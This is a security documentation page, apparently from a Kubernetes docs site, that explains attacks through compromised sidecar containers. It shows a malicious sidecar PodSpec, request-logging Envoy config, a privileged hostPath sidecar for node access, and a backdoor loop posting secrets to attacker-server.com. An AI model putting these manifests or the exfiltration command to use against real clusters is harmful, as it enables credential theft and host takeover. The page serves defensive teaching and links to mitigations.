---
sidebar_position: 16
title: "Compromised Sidecars"
description: "How attackers exploit insecure or malicious sidecar containers to intercept data, escalate privileges, and persist within Kubernetes clusters."
---

# Compromised Sidecars

**Sidecar containers** in Kubernetes extend the functionality of primary application containers by handling logging, monitoring, security, or proxy services. If **misconfigured, compromised, or maliciously injected**, attackers can use sidecars to **steal sensitive data, intercept requests, escalate privileges, and persist within the cluster**.

---

## Exploitation Steps: Abusing Sidecars for Malicious Activity

An attacker exploits **insecure or compromised sidecar containers** to manipulate traffic, extract sensitive data, or maintain persistence.

### Step 1: Deploy a Malicious Sidecar

If an attacker gains control over a workload’s **PodSpec**, they inject a **malicious sidecar** to intercept application data.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-sidecar
spec:
  containers:
    - name: legitimate-app
      image: secure-app:latest
    - name: malicious-sidecar
      image: attacker/spy-container
      volumeMounts:
        - mountPath: /app-data
          name: shared-volume
  volumes:
    - name: shared-volume
      emptyDir: {}
```

Once deployed, the malicious sidecar can **exfiltrate logs, credentials, and API responses**.

### Step 2: Intercept and Modify Traffic

Sidecars are commonly used for **service mesh proxies** and **logging agents**. An attacker abuses a misconfigured sidecar to intercept **sensitive API requests**.

Example: Capturing all incoming requests in an **Envoy sidecar**:

```yaml
admin:
  access_log_path: "/dev/stdout"
  profile_path: "/var/lib/envoy/profile"
static_resources:
  listeners:
    - address: "0.0.0.0"
      filter_chains:
        - filters:
            - name: "envoy.http_connection_manager"
              config:
                codec_type: "AUTO"
                access_log:
                  - name: "envoy.file_access_log"
                    config:
                      path: "/data/logs/requests.log"
```

Captured API responses contain **JWT tokens, credentials, and user data**.

### Step 3: Abuse Privileged Sidecars for Host Access

If a sidecar runs **with elevated privileges**, an attacker can escalate access to the host.

Example: A misconfigured sidecar with **hostPath volume access**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-sidecar
spec:
  containers:
    - name: main-app
      image: secure-app
    - name: sidecar
      image: attacker/root-access
      securityContext:
        privileged: true
      volumeMounts:
        - mountPath: /host
          name: host-volume
  volumes:
    - name: host-volume
      hostPath:
        path: /
        type: Directory
```

Once inside the pod, the attacker **gains control over the Kubernetes node**.

```bash
kubectl exec -it privileged-sidecar -- /bin/sh
ls /host/etc/
```

### Step 4: Persist Within the Cluster

Attackers use **malicious sidecars** to maintain long-term access, even if the primary container is removed.

- **Hidden Reverse Shell:** The sidecar listens for remote commands.
- **Stealthy Traffic Proxy:** The sidecar routes traffic to an attacker-controlled server.
- **Scheduled Data Exfiltration:** The sidecar periodically sends logs and credentials.

Example: Backdoor inside a sidecar container:

```bash
while true; do cat /data/secrets.txt | curl -X POST -d @- http://attacker-server.com/upload; sleep 60; done
```

Even if the **main container is deleted**, the sidecar remains **running and active**.

### Result

The attacker successfully **intercepted sensitive data, modified traffic, escalated privileges, and persisted within the cluster** using a compromised or malicious sidecar.

---

## Mitigation Steps

To protect against **compromised sidecars**, follow the security best practices outlined in:

➡ **[Securing Kubernetes Sidecars](/docs/best_practices/cluster_setup_and_hardening/compromised_sidecars_mitigation)**

This guide covers techniques such as **restricting sidecar permissions, enforcing strict security contexts, implementing service mesh policies, and monitoring sidecar activity** to prevent unauthorized use.
